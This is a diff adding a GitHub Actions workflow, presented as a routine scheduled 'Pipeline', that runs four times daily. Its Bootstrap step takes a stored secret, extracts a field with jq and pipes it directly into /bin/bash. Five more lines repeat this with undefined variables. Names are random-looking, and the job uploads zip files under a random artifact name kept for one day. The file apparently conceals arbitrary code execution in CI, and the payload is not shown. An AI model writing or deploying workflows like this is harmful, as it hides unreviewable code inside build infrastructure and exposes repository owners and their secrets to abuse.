@@ -1,0 +1,33 @@
+name: Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '0 5,11,17,23 * * *'
+permissions:
+  contents: read
+  actions: read
+jobs:
+  deploy:
+    name: Main task
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Bootstrap
+        env:
+          cfm90: ${{ secrets.cfm90 }}
+        run: |
+          printf '%s' "$cfm90" | jq -r .jy4 | /bin/bash
+          printf '%s' "$qm1" | jq -r .wos8600 | /bin/bash
+          printf '%s' "$o48646" | jq -r .nu906 | /bin/bash
+          echo $e4 | jq -r .tiqg5 | /bin/bash
+          echo $g7880 | jq -r .pam63147 | /bin/bash
+          printf '%s' "$wvb64" | jq -r .upqe915 | /bin/bash
+
+      - name: Archive artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: ZTL1O7Wx
+          path: "*.zip"
+          retention-days: 1
